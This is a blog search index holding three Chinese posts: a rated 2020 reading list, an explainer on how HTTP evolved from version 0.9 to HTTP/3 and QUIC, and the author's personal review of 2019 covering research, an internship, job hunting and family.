<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>我的2020书单</title>
    <url>/2020/06/01/%E6%88%91%E7%9A%842020%E4%B9%A6%E5%8D%95/</url>
    <content><![CDATA[<center>我的2020年书单，附带评分和点评，不断更新中……</center>

<a id="more"></a>
<p>前情提要：</p>
<ul>
<li>评分标准为 1-5 星，5星为力荐。</li>
<li>点评是我自己的一些想法和看法。</li>
</ul>
<h5 id="生活与格局类"><a href="#生活与格局类" class="headerlink" title="生活与格局类"></a>生活与格局类</h5><p>[1] 创京东：刘强东亲述创业之路</p>
<ul>
<li>作者：李志刚</li>
<li>评分：4 星</li>
<li>点评：伟大的公司必有其伟大之处，京东的服务真的是一流的，公司的人、团队和文化一定会助推京东越来越好。成功的人也必有其成功之处，和马化腾一样，东哥也是大学期间就靠编程赚得上万元。自愧不如，在那个时代，他们真的是太了不起。格局真的太重要了，也难怪他们可以如此成功。</li>
</ul>
<p>[2] 一禅小和尚</p>
<ul>
<li><p>作者：一禅小和尚</p>
</li>
<li><p>评分：5 星</p>
</li>
<li>点评：富有禅意，简单而美好，很温暖。</li>
</ul>
<p>[3] 雷军-在风口上顺势而为</p>
<ul>
<li>作者：王刚</li>
<li>评分：3 星</li>
<li>点评：书中很多重复的内容，内容质量一般，读起来不是很有意思。大概了解了接地气的雷布斯的奋斗之路，确实是：不鸣则已，一鸣惊人。40岁再次创业，在今年小米总部迁入小米科技园时，他还发微博说：北漂，奋斗九年多，终于买房了！真是可爱。这本书给我最大的启示：越是做到极致的东西就越简单，伟大的事情也无非是做好每一件小事。相信在雷布斯的带领下，金山和小米都会越来越好。</li>
</ul>
<p>[4] 半小时漫画经济学1-2</p>
<ul>
<li>作者：陈磊-半小时漫画团队</li>
<li>评分：4 星</li>
<li>点评：科普性质，简单易懂，还挺有意思。不过，内容太简单，只适合闲暇时当作经济学入门书籍看，想要系统学习经济学还是得看专业书籍。</li>
</ul>
<p>[4] 半小时漫画中国史2</p>
<ul>
<li>作者：二混子</li>
<li>评分：5 星</li>
<li>点评：读史明智，鉴往知来。以风趣幽默的方式讲历史。</li>
</ul>
<p>[5] 一禅小和尚：暖心治愈合集</p>
<ul>
<li>作者：一禅小和尚</li>
<li>评分：5 星</li>
<li>点评：好治愈的漫画！</li>
</ul>
<p>[6] 我可以咬一口吗</p>
<ul>
<li>作者：利兹-克利莫</li>
<li>评分：4 星</li>
<li>点评：很温馨，很简单的快乐，虽然有点不大能看懂……</li>
</ul>
<p>[7] 你今天真好看</p>
<ul>
<li>作者：利兹-克利莫</li>
<li>评分：4 星</li>
<li>点评：温馨而简单的漫画，收获的却是满满的快乐。</li>
</ul>
<p>[8] 马云：未来已来</p>
<ul>
<li>阿里巴巴集团</li>
<li>评分：5 星</li>
<li>点评：从年少轻狂四处碰壁，到成熟稳重将阿里巴巴打造成如此伟大的公司，再到现在退居幕后去做更有价值的事情，不得不说，马云创造了奇迹。相信他塑造的企业文化和使命会让阿里越来越好。顺便佩服一下马老师的演讲能力，真是杠杠的。划重点！未来已来，不要抱怨，要从抱怨中寻找机会。</li>
</ul>
<p>[9] 三分钟漫画汽车史</p>
<ul>
<li>作者：赛雷</li>
<li>评分：3 星</li>
<li>点评：涨知识了，以漫画的方式描绘各大汽车品牌的历史，但是这个漫画的风格我不是很喜欢。</li>
</ul>
<p>[10] 特斯拉传：实现不可能</p>
<ul>
<li>作者：哈米什-麦肯齐</li>
<li>评分：4 星</li>
<li>点评：要么改变，要么死亡，颠覆，来自于特斯拉。庆幸生活在这样美好的时代，从智能手机出现到普及，再到现如今电动汽车时代已经拉开序幕，短短几年，发展真是太迅速。关注特斯拉很久了，从这本书全面了解了特斯拉艰难的成长史。特斯拉真是创造了很多奇迹，面对来自传统能源和汽车行业巨大的阻力，经历一次次资金危机，最终都能够挺过来，带给这个世界一次颠覆，可以称得上伟大了。虽然国内也有蔚来、拜腾、比亚迪等电动汽车厂商，但是，特斯拉依然是电动汽车的标杆。随着现如今特斯拉国内的工厂交付，总感觉，在电动汽车时代，我们又要落后了。那么，问题来了，什么时候能拥有一辆特斯拉呢？加油吧，期待着！</li>
</ul>
<p>[11] 以幽默的方式过一生</p>
<ul>
<li>作者：琢磨大师</li>
<li>评分：4 星</li>
<li>点评：很棒的书，不愧有几十万人读过，评分也很高。以简单幽默的方式解读生活中的哲学，关于成长、职场、爱情、婚姻、教育、交友等等。我们都希望生活充满味道，却总是很难发现蕴含在生活细节里的一些乐趣。我们总说，听过很多道理却依然过不好一生。书中的很多道理，你可能也已经听过很多次，但是，这本书给我感觉还是很不一样的，觉得说到心坎里了，很有共鸣，也给了我很多的启发。赞！</li>
</ul>
<p>[12] 新型冠状病毒感染防护</p>
<ul>
<li>作者：何剑锋 宋铁</li>
<li>评分：5 星</li>
<li>点评：保护好自己，安心待在家，不给国家添麻烦，共克时艰，加油！</li>
</ul>
<p>[13] 万历十五年</p>
<ul>
<li>作者：黄仁宇</li>
<li>评分：5 星</li>
<li>点评：第二次读这本书。一本有争议的书，尽管学术界并不太认可，却还是挡不住大众对它的喜爱。那个时代，法制的成长被遏制，而以抽象的道德代替法律，自然带来很多问题。万历皇帝、张居正、申时行、海瑞、戚继光、李贽，一个个鲜活的人物，每个人都有理想，都想改变一点什么，然而却也都有无奈。</li>
</ul>
<h5 id="理财与经济类"><a href="#理财与经济类" class="headerlink" title="理财与经济类"></a>理财与经济类</h5><p>[1] 指数基金投资指南</p>
<ul>
<li>银行螺丝钉</li>
<li>评分：5 星</li>
<li>点评：内容十分全面，通俗易懂，书中很多思想都值得学习和借鉴。学习炒股也有很长的时间了，可是一直没赚到什么钱，还消耗了非常多的时间和精力。通过这本书，全面系统的了解了指数基金投资，对于自己的投资有一定的指导意义。对于没时间看股票或者不具备投资知识的人来说，指数基金确实是一个非常不错的选择。继续学习与实践投资，让钱生钱！借用书中一句话：我相信，我终将富有！</li>
</ul>
<p>[2] 菜鸟定投笔记</p>
<ul>
<li>作者：好规划网</li>
<li>评分：3 星</li>
<li>点评：比较浅显，适合初学者看看。</li>
</ul>
<p>[3] 菜场经济学</p>
<ul>
<li>作者：财上海</li>
<li>评分：4 星</li>
<li>点评：断断续续用了几年才看完的一本书，整本书好像都围绕现在中国人非常关心的楼市来介绍经济学知识。总体来说，有点网络喷子的感觉，读起来很过瘾，读完以后总感觉缺点什么。前几年看这本书，觉得书中说了很多大实话，也认为很多观点都非常正确。现在再来看，觉得一半一半吧，毕竟几年前的书了，有些观点已经过时。对于当下的中国而言，改革进入深水区，改革必然会牵扯到很多的利益，改革也会是个漫长的过程，改革更需要大智慧，但是，这几年我们也看到很多书中描述的难题正在慢慢被解决。我相信中国人一定会用自己的智慧找到解决这些问题的办法，我也相信我们的国家一定会有美好的未来。</li>
</ul>
<p>[4] 富爸爸穷爸爸</p>
<ul>
<li>作者：罗伯特-清崎</li>
<li>评分：5 星</li>
<li>点评：如果我今天停止工作，我还能活多久？这本书对资产与负债给出了新奇的解释，富人买入资产，让钱为自己工作，而穷人和中产阶级为钱而工作，不断买入负债，并且认为解决方法就是挣更多的钱。资产可以给你产生现金流，而现金流才是支撑你消费的根本，要不然你就会陷入努力工作、买入负债的循环。现如今，我们也经常听到睡后收入这个词，其实都在强调投资产生的收入。我们只关注智商和情商，智商是天生的，情商可以培养，但是我们往往忽略了财商。这本书确实带来很多反思，从小到大，教育我们的都是好好学习，学好某项技能，成为某个领域的专家，却从来没有人告诉我们如何去理财和投资。不过，所有的为时已晚，都是开始的最好时候。</li>
</ul>
<p>[5] 傻瓜式投资</p>
<ul>
<li>作者：飞泥翱空</li>
<li>评分：4 星</li>
<li>点评：股市里，努力不一定有回报，不努力基本就是在赌博和娱乐了。股市是一个考验人性的地方，很多韭菜，追涨杀跌，其实是败给了自己。那么，如何破除1赚2平7亏的股市定律呢？答案是，自律。不做选择就是最好的选择，所以，简单的50：50策略或许是一种方法。</li>
</ul>
<p>[6] 财务自由之路</p>
<ul>
<li>作者：博多-舍费尔</li>
<li>评分：4 星</li>
<li>点评：读出了一点成功学的味道，核心的观点和其他的理财书籍大同小异。作者的思路还是很明确的，首先，从思想上，认识到富有是人生而就有的权利，树立正确的金钱观；然后，在行动上，处理债务，增加收入、储蓄、投资，相信复利和计划的强大力量；最后，通过教练/专家网络和播种金钱，让自己的财富进一步升华。借用一句话，爱这个世界的人，也会被世界以爱相待；给予这个世界金钱的人，世界将会以金钱回报他。</li>
</ul>
<p>[7] 小狗钱钱</p>
<ul>
<li>作者：博多-舍费尔</li>
<li>评分：4 星</li>
<li>点评：配合着《财务自由之路》看完了这本书，以讲故事的方式来讲解理财知识，确实是有点意思，不错的理财入门书籍。运气其实只是充分准备加上努力工作的结果，笨人只有一次好运，而聪明人永远都有好运。小女孩的成功，离不开钱钱，金先生等人，但是，最重要的还是她自己的努力。从理财的角度来看，感触最深的点在于，要给自己养一只会下金蛋的“鹅”，当然，如果有钱钱或者金先生来指导一下，那就更好了。</li>
</ul>
<p>[8] 独立，从财富开始：水湄物语的理财20课</p>
<ul>
<li>作者：水湄物语</li>
<li>评分：4 星</li>
<li>点评：这不就是之前读过的《富爸爸穷爸爸》《财务自由之路》、《小狗钱钱》以及《傻瓜式投资》的通俗版本吗？作者只是借用了这些书里面的思想，没什么新的见解。不过，读完也还是有收获的，比如了解了国债逆回购和海外房产以及网络贷等知识，算是扩宽了投资视野。</li>
</ul>
<p>[9] 投资大白话</p>
<ul>
<li>作者：我是腾腾爸</li>
<li>评分：4 星</li>
<li>点评：价值也许会迟到，但从不会缺席，又是一本推崇价值投资的书。不愧是雪球的话唠先生，佩服作者的经历，文笔也不错，配合着一些生活中的例子，读起来还比较有趣。关键就是，道理都懂，但是人性的弱点，难克服。</li>
</ul>
<p>[10] 投资要义</p>
<ul>
<li>作者：刘诚</li>
<li>评分：5 星</li>
<li>点评：整本书深入浅出，内容简明扼要，从理论到实践，投资体系的三个层次是宏观的投资理念，但是结合实战经验的讲解却让我感到十分深刻。如果有一定的背景知识，一定会觉得这本书通俗易懂。相比于纯讲理论讲道理的书，这种从实战中总结的经验更值得学习，这应该是最近看过的讲得最通透的书了，受益匪浅！</li>
</ul>
<p>[11] 韭菜的自我修养</p>
<ul>
<li><p>作者：李笑来</p>
</li>
<li><p>评分：4 星</p>
</li>
<li>点评：韭菜防割指南，值得一看，但是整本书似乎没有什么逻辑，显得有点随意。在这个信息繁杂的时代，韭菜大多数时候都会被外界的信息所干扰，所以非常认同这个观点：孤独是成功交易者最宝贵的品质。在生命中的某一个狭小的领域，做一个特立独行且正确的人是一种很享受的事情。</li>
</ul>
<p>[12] 远离迷茫，从学会赚钱开始</p>
<ul>
<li><p>作者：曾鹏宇</p>
</li>
<li><p>评分：4 星</p>
</li>
<li>点评：轻松轻松读完，佩服作者讲故事的能力，看看小故事，明白一点小道理，也未尝不是一件愉悦的事情。书中讲了一些成功学，或者叫做方法论吧，核心思想就是，有钱了才不会迷茫！书中传递的金钱观和人生观还是值得借鉴的，你对钱的态度，就是你做人的态度，很真实。</li>
</ul>
<p>[13] 投资中最简单的事</p>
<ul>
<li><p>作者：邱国鹭</p>
</li>
<li><p>评分：4 星</p>
</li>
<li>点评：知易行难，简单的事做起来却并不简单。理论还是那些理论，邱总确实有不一样的解读，很多要点可以看做投资准则。但是，书中的内容有些散，也有些老了，特别是一些例子，没有时间背景交代，很难辨别。</li>
</ul>
<h5 id="专业与技术类"><a href="#专业与技术类" class="headerlink" title="专业与技术类"></a>专业与技术类</h5><p>[1] MySQL必知必会</p>
<ul>
<li>作者：Ben Forta</li>
<li>评分：4 星</li>
<li>点评：慕名而来，快速读过一遍。年代久远的纯入门书籍，涉及的内容还算全面，但是讲得比较简单。</li>
</ul>
<p>[2] 图解 HTTP</p>
<ul>
<li>作者：上野宣</li>
<li>评分：4 星</li>
<li>点评：毕竟是图解系列，简单易懂，快速读完。整体了解了 HTTP 协议的相关知识，其中的很多知识点还值得更深入地学习。另外，书中没有包括的 QUIC、HTTP 3 等新协议也是十分重要的。</li>
</ul>
<p>[3] 程序员的自我修养</p>
<ul>
<li>作者：李笑来</li>
<li>评分：5 星</li>
<li>点评：前三章比较有意思，最有价值的内容应该是职业生涯和个人发展的内容，入职前读一读，甚好。我非常赞同作者不断学习，不断尝试的态度，也非常认可作者所说的非技术能力的重要性。此外，作者对于美的认识也让我感触挺深。一句话共勉：工作、技术、写代码并不是你存在的意义，而生活才是，你要懂得生活，并且学会生活。</li>
</ul>
<p>[4] Linux 就该这么学</p>
<ul>
<li>作者：刘遄</li>
<li>评分：3 星</li>
<li>点评：适合入门，涉及的内容也比较全面，但是深度不够。</li>
</ul>
<p>[5] 深入浅出Docker</p>
<ul>
<li>作者：奈吉尔-波尔顿</li>
<li>评分：5 星</li>
<li>点评：非常不错的Docker入门书，思路非常清晰，理论介绍配合举例说明，读起来比较舒服。相比于之前Docker入门相关的书籍，这本书的内容比较新，书中的内容也比较全面，深入浅出，案例分析很透彻。架构分析那一部分让我印象特别深刻，我在之前做过一次关于Docker的小分享，那时候参考的书籍和博客都还是讲的依赖于LXC的架构，没想到早就已经有了新的标准和实现，深感惭愧。</li>
</ul>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP 协议梳理</title>
    <url>/2020/03/01/HTTP-%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<p>　　最近，了解到优秀的 QUIC 协议以及基于 QUIC 的 HTTP 3。于是， 我梳理了一下 HTTP 的发展历程，总结整理了各个版本的特性。</p>
<a id="more"></a>
<p>　　HTTP协议是超文本传输协议 Hyper Text Transfer Protocol 的缩写，是用于从万维网（WWW，World Wide Web ）服务器传输超文本到本地浏览器的传送协议。HTTP 是基于 TCP/IP 协议的应用层协议。</p>
<h4 id="HTTP-0-9-版本"><a href="#HTTP-0-9-版本" class="headerlink" title="HTTP 0.9 版本"></a>HTTP 0.9 版本</h4><p>　　HTTP 0.9 版本于 1991 年发布，它不涉及数据包的传输，只规定了客户端和服务器之间的通信格式，默认使用 80 端口，该版本非常简单，只支持 GET 请求，没有首部，其设计目标也只是获取 HTML，也就是说只支持文本传输。经过随后几年的发展，HTTP 逐渐流行起来。截至 1995 年，世界上有超过 18000 台服务器在 80 端口处理 HTTP 请求。</p>
<h4 id="HTTP-1-0-版本"><a href="#HTTP-1-0-版本" class="headerlink" title="HTTP 1.0 版本"></a>HTTP 1.0 版本</h4><p>　　HTTP 1.0 版本于 1996 年 5 月发布，该版本大大丰富了 HTTP 的传输内容，为互联网的发展奠定了基础。相比 HTTP 0.9，HTTP 1.0 主要有以下特性：</p>
<ul>
<li>支持传输 HTML 文件以外其他类型的内容，这使得互联网不仅可以传输文字，还能传输图像、视频、二进制文件。</li>
<li>除了 GET 命令，还加入了 POST 、HEAD 等命令， 丰富了浏览器与服务器的交互手段。</li>
<li>HTTP 请求和回应的格式改变。 除了数据部分，每次通信都必须包括头信息，用来描述一些元数据。请求与响应支持 HTTP 头，增加了状态码。</li>
<li>……</li>
</ul>
<p>　　但是，HTTP 1.0 版本还是存在一些缺点，其中主要缺点是，每个TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。但是，TCP 新建连接的成本很高，因为需要客户端和服务器三次握手，并且开始时发送速率较慢，因为 TCP 通过慢开始启动。 所以，HTTP 1.0 版本的性能就比较差。随着网页加载的外部资源越来越多，这个问题就变得更加突出。</p>
<h4 id="HTTP-1-1-版本"><a href="#HTTP-1-1-版本" class="headerlink" title="HTTP 1.1 版本"></a>HTTP 1.1 版本</h4><p>　　HTTP 1.1 版本于1997年1月发布，直到现在它还是最流行的版本。它进一步完善了 HTTP 协议，主要有持久连接、管线化等新特性。</p>
<h5 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h5><p>　　客户端发送请求时，在请求头部增加 Connection: keep-alive，即 TCP 连接时默认不关闭，可以被多个请求复用。客户端和服务器发现对方一段时间没有活动，也可以主动关闭连接。规范的做法是，客户端在最后一个请求时，发送 Connection: close，明确要求服务器关闭 TCP 连接。为了安全性，对于同一个域名，大多数浏览器允许同时建立 6 个持久连接。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2020/3/1-1.png" alt="1-1"></p>
<p>　　如图所示（图片引用自《图解HTTP》），在 HTTP 1.0 版本中，每个资源的下载都需要重新建立连接，每次建连都包含tcp的三次握手，完成数据传递后又通过tcp的四次挥手关闭连接。周而复始，访问一个较为复杂的网页会消耗大量的时间。采用持久连接后，服务端发出响应后让<code>TCP</code>连接继续打开着。同一对客户端/服务端之间的后续请求和响应可以通过这个连接发送。</p>
<p>　　　需要注意的是，HTTP 的 Keep-alive 主要是保持客户端与服务端的连接不会因为一次请求的结束而被关闭，以此来实现连接复用的目的。而 TCP 的 Keep-alive 则更像一种保鲜机制，即当连接建立后，相关socket可以定期向对端发送心跳包来检查连接是否还有效，用户可以设置相关的参数，包括多久开始发送、每次发送的间隔、发送次数等。如果一直没有收到对端的响应，则认为连接已经断开并释放相关资源。</p>
<h5 id="管线化-pipeline"><a href="#管线化-pipeline" class="headerlink" title="管线化 pipeline"></a>管线化 pipeline</h5><p>　　HTTP 管线化是将多个 HTTP 请求整批提交的技术，而在传送过程中不需先等待服务端的回应。管线化机制须通过持久连接完成。浏览器将HTTP请求大批提交可大幅缩短页面的加载时间，特别是在传输延迟较高的情况下。如下图所示，有了持久连接的支持，就把多个HTTP请求放到一个TCP连接中发送，并且在发送过程中不需要等待服务器对前一个请求的响应；只不过，客户端还是要按照发送请求的顺序来接收响应。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2020/3/1-2.png" alt="1-2"></p>
<p>　　对头阻塞问题：如图所示，客户端依次发送了 3 个请求，假设服务端对第 1 个请求内容的处理是比较耗时的，在第 1 个请求处理完成之前，请求 2 和请求 3 都已经处理完成了，而此时，但是响应 2 和响应 3 还不能返回，必须等到响应 1 返回之后才能返回。更严重的是，如果服务端在处理pipeline请求的时候出现问题，那么排在后面的请求都会被阻塞。</p>
<h5 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h5><p>　　虽然 HTTP 1.1 版本相比于以前的版本进行了比较大的优化，但是它依然存在以下问题：</p>
<ul>
<li>在传输数据时，每次都要重新建立连接，对移动端特别不友好。</li>
<li>传输内容是明文，不够安全。</li>
<li>HTTP头部内容过大，每次请求的头部变化不大，造成浪费。</li>
<li>持久连接给服务端带来性能压力。</li>
</ul>
<h4 id="SPDY-协议"><a href="#SPDY-协议" class="headerlink" title="SPDY 协议"></a>SPDY 协议</h4><p>　　2009年，Google 公开了自行研发的 SPDY 协议， 目标是优化 HTTP 协议的性能，通过压缩、多路复用和优先级等技术，缩短网页的加载时间并提高安全性。其核心思想是尽量减少 TCP 连接数。SPDY 并不是一种用于替代 HTTP 的协议，而是对 HTTP 协议的增强。主要有以下改进：</p>
<ul>
<li>支持多路复用，实现请求优化。</li>
<li>压缩了HTTP报文首部信息，节省了传输数据带宽。</li>
<li>支持服务器推送技术。</li>
<li>强制使用SSL传输协议，全部请求由SSL加密，信息传输更安全。</li>
</ul>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2020/3/1-3.png" alt="1-3"></p>
<p>　　SPDY 为 HTTP 2 版本的制定提供了原型和参考依据。2016年，Google 决定不再支持 SPDY 的开发，这也是为了给 HTTP 2 让路。</p>
<h4 id="HTTP-2-版本"><a href="#HTTP-2-版本" class="headerlink" title="HTTP 2 版本"></a>HTTP 2 版本</h4><p>　　HTTP 2 版本于 2015 年发布。因为标准委员会不打算再发布子版本，所以它不叫 HTTP 2.0 ，下一个新版本将是 HTTP 3。虽然 HTTP 2 版本基本沿用了 SPDY 的设计理念，但仍然存下以下差异：</p>
<ul>
<li>HTTP 2 可以在TCP之上直接使用，而 SPDY 必须在 TLS 层之上。</li>
<li>更加完善的协议商讨和确认流程。</li>
<li>更加完善的服务器推送机制。</li>
<li>新的头部压缩算法 HPACK。</li>
<li>添加了控制帧的种类，对帧的格式考虑更加细致。</li>
</ul>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2020/3/1-4.jpg" alt="1-4"></p>
<h5 id="二进制分帧"><a href="#二进制分帧" class="headerlink" title="二进制分帧"></a>二进制分帧</h5><p>　　HTTP 2 在应用层与传输层之间增加一个二进制分帧层，使得客户端与服务器通过交换帧来通信，帧是通信的最小单位，以此达到在不改动 HTTP 的语义，HTTP 方法、状态码、URI 及首部字段的情况下。二进制分帧层会将所有传输的信息分为更小的消息和帧，并采用二进制格式编码，其中 HTTP 1.x 的首部信息会被封装到 Headers 帧，而 Request Body 则封装到 Data 帧。该机制使得 HTTP 2 突破了 HTTP 1.1 的性能限制，改进传输性能，实现低延迟和高吞吐量。</p>
<h5 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h5><p>　　所谓多路复用，即在一个 TCP 连接中存在多个流，即可以同时发送多个请求，对端可以通过帧中的表示知道该帧属于哪个请求。客户端乱序发送帧，到服务端后再根据每个帧首部的流标识符重新组装。通过该技术，可以避免 HTTP 旧版本的队头阻塞问题，极大提高传输性能。</p>
<p>　　如图所示，HTTP 2 引入了流和帧的概念，将每个完整的请求响应过程称为一个流，再将每个流拆分为多个帧（包括数据帧，控制帧等）。通过流和帧将一个完成请求响应过程“打碎”，再按照优先级将多个流的帧数据混在一起发送到服务端，服务端再通过流ID和帧ID将数据还原，以同样的方式将数据传回给客户端。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2020/3/1-5.jpg" alt="1-5"></p>
<h5 id="数据流优先级"><a href="#数据流优先级" class="headerlink" title="数据流优先级"></a>数据流优先级</h5><p>　　虽然多路复用解决队头阻塞的问题，但是引入了另一个问题，即如何确保在有限的带宽中优先加载最重要的资源。多路复用机制有可能会影响重要资源的加载。因此，HTTP 2 对数据流可以设置优先级，优先级决定了客户端和服务端处理不同的流采用不同的策略。</p>
<h5 id="服务端推送"><a href="#服务端推送" class="headerlink" title="服务端推送"></a>服务端推送</h5><p>　　在 HTTP 2 中，服务器可以向客户发送请求之外的内容，比如正在请求一个页面时，服务器会把页面相关的 logo，CSS 等文件直接推送到客户端，而不会等到请求来的时候再发送，因为服务器认为客户端会用到这些东西。只有当服务端认为某些资源存在一定的关联性，即客户端申请了资源A，必然会继续申请资源B、资源C、资源D…的时候，服务端才会主动推送这些资源，以此来达到节省浏览器发送请求的过程。</p>
<h5 id="头部压缩"><a href="#头部压缩" class="headerlink" title="头部压缩"></a>头部压缩</h5><p>　　在HTTP 就斑斑中很多头部都是重复的甚至多余的，此外，有些头部的内容则比较庞大。由于 HTTP 是无状态协议，头部中每次会携带一些重复的信息，造成资源的浪费。因此，HTTP 2 使用首部表来跟踪和存储之前发送的键值对，对于相同的内容，不会再每次请求和响应时发送。将头部进行压缩不仅可以节省资源，还可以缩短数据传递的延迟。</p>
<h4 id="HTTP-3-版本"><a href="#HTTP-3-版本" class="headerlink" title="HTTP 3 版本"></a>HTTP 3 版本</h4><p>　　QUIC（Quick UDP Internet Connections）协议是 Google 提出的一种基于UDP的低延时、多并发的传输协议。如下图所示，它实现了基于 UDP 的 TLS + HTTP 2 功能。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2020/3/1-6.jpg" alt="1-6"></p>
<p>　　QUIC 将原来 TCP 在操作系统内核空间中的实现（例如，拥塞避免、流量控制、丢包重传等）转移到用户空间，这使得 QUIC 更加灵活。此外，由于 QUIC 不是在操作系统内核中进行开发，因此开发迭代速度相对较快，部署成本低、阻力小。QUIC 的最大优点是快，其主要有以下特性：</p>
<ul>
<li>0 RTT 。</li>
<li>UDP 之上的多路复用，避免了队头阻塞。</li>
<li>连接迁移。</li>
<li>前向冗余纠错。</li>
<li>……</li>
</ul>
<p>　　Http-Over-QUIC 已经正式更名为 HTTP 3，这标志着 QUIC 会在随后的几年内成为支持 HTTP 的主要协议。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>　　本文主要梳理了 HTTP 协议发展的历程，简单介绍了各个版本的新特性。对于 HTTP 2 以及 HTTP 3，其中有很多有意思的、值得探讨的机制，我将在后续的博客中详细介绍。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-未来可期</title>
    <url>/2020/01/01/2020-%E6%9C%AA%E6%9D%A5%E5%8F%AF%E6%9C%9F/</url>
    <content><![CDATA[<center>告别 2019，迎来 2020。</center>

<a id="more"></a>
<p>　　告别 2019，我们又来到了崭新的 2020。按照国际惯例，又要对过去的一年做个深入的总结。博客也有一段时间没有打理了，因为这一年的经历让我深刻的意识到我还有更值得做的事情。当然，不管有没有人关心，博客还是会继续写下去，只是我想把更多的精力放在让自己变得更优秀，然后再来和默默关注的人分享我的想法。2019 的经历历历在目，2020 的未来期待不已。2019 年，经历了发论文、实习、找工作、见家长……匆匆忙忙，一年又过去了，有遗憾也有庆幸。</p>
<p>　　上半年，主要的精力都集中在发论文和找实习。读研以来，自己一直非常迷茫，导师也没有给太多的建议，希望我们可以自己确定方向，自己找研究点。因此，我对于6LoWPAN（IPv6 Low Power Wireless Personal Area Network，IPv6低功耗无线个人局域网）、TSCH（Time-Slotted Channel Hopping，时隙信道跳频）、ICN（Information-Centric Networking，信息中心网络）/NDN（Named Data Networking ，命名数据网络）、边缘计算都有所研究，但一直没有确定下来要做什么。直到硕士论文开题才确定在ICN和边缘计算领域做研究。开题也算是为我的小论文打下来了一定的基础，但是，从论文构思、调研到开始去做，还是花费了很多的时间。除了偶尔可以与导师讨论外，写论文做实验全都是自己一个人在做，而且，当时同实验室其他老师的学生已经在找实习，对比之下，惨不忍睹。每天听着别人面试的声音，自己却在苦逼的熬论文，那段时间真是十分煎熬，十分痛苦。</p>
<p>　　直到5月份完成论文，并投稿到我们这个小领域的一个顶级会议，我才开始找实习，那时候很多公司的招聘已经结束了。还好，最后拿到了深信服的实习offer。然后，动之以情，晓之以理，导师才同意让我去实习。再后来，论文被拒，又转投到另一个会议，终于被接收了。12月份飞到天津参会，第一次去天津，第一次参加国际会议，第一次用英文作报告，没有想象中那么高大上，但也算是长见识啦。论文的事情可谓是一波三折，还好最后总算是有所收获了，也算是对得起这么长时间的付出了。</p>
<p>　　下半年，我的主要的精力用于实习、找工作和准备毕业。在深信服实习两个月，也是一份不错的经历。读书这么多年，还没有真正到公司实战过，虽然只有两个月，但是对我来说意义不凡。深信服确实是一家有前景的公司，感受了这家公司的不错工作氛围，也吃得白白胖胖了。有很不错的同事，大家都很上进，当然，也有很好的激励制度，企业文化感觉有点像华为，大家都很拼，加班比较多。实习生进去会安排导师，会有比较好的指导。总的来说，实习的经历，除了了解了项目开发流程，更重要的是结识了我的导师，认识了一些未来的同行，毕竟人脉也是很重要的资源。</p>
<p>　　至于我的秋招，虽然不算惨淡，但和自己预期的结果还是有差距。前段时间，我也专门写了博客进行总结，在这里就不展开说啦。现在回想起来，主要还是自己准备不够充分，没有花时间去复习。最后，也算是找到了自己想要去的公司，有时候，可能就是缘分吧！既然选择了，就好好工作，在哪都是奋斗，何不努力去创造呢。</p>
<p>　　暑假实习结束，约好和女朋友一起回学校，我从深圳到广州，她爸爸从佛山送她到广州，于是，和在广州和她爸爸一起吃了顿饭，也算是第一次见家长啦。后来，她爸妈回长沙，又正式登门拜访。再后来，就经常去她家蹭饭啦，哈哈哈。开始几次，我每次都很紧张，后来也就慢慢习惯了，但也还是没有那么自在。曾经也很多次想过见家长的场景，经历过才发现比想象的还有意思。人生还有很多没有经历过的事情，未来应该会越来越有趣。计划今年带她回家见见我的家人，去我生活过的地方走走看看，未来可期呀。</p>
<p>　　这一年也纠结了要不要读博，考虑了很多，有家庭的情况、和女朋友的未来、自己的规划等等，最终还是决定不读了。其中，有一些对现实的屈服，也有一些是对未来的期盼。人生，会遇到很多机会，也会有很多的需要抉择的时刻，或许每个选择都有可能会改变你的人生轨迹，但是，没有什么选择就一定是对的。如果决定了那就不要后悔，因为，只要选择向前，那就没有错。</p>
<p>　　赶在这一年的末尾，做了两件值得说道说道的事情。一是，开始认真读书。立 Flag 很简单，但是坚持去做真的很难。很庆幸，我也慢慢养成了读书的习惯，读完一本书，我也会谈一谈自己的感想。这还是要感谢微信读书，以前喜欢纸质书，现在也慢慢喜欢上了电子书，无论在哪里，想读就读。特别是微信读书推出 PC 版以后，已经慢慢习惯在笔记上看书，还可以做笔记。一边听轻音乐，一边看书，确实是一件非常惬意的事情。当然，才刚刚开始每周坚持读书，没有什么心得，但是，我相信慢慢积累，终有一天会变成一个有趣的人。</p>
<p>　　另外一件事就是学习理财。虽然没有什么资金，但是自己学炒股也有很久了。以前炒股呢，其实就是赌博。完全不懂，没有任何炒股的知识，就是瞎买，然后赌运气。所以，涨涨跌跌，折腾了一年才赚了一点点钱。最近，在微信读书上读了指数基金的相关书籍，算是对指数基金有了全面的认识。特别是，马上要工作了，会有固定收入，也不会再有那么多时间每天盯着股市，指数基金会是一个不错的选择。不管以后怎么样，至少我已经开始有了理财的意识，不再是像赌博一样的炒股。学习理财会是一个漫长的过程，需要不断地学习，然后实践，也需要总结。但是，理财是人生必须要学的，如何让钱生钱也是一门学问。总之，搞钱，我还是蛮有兴趣的。</p>
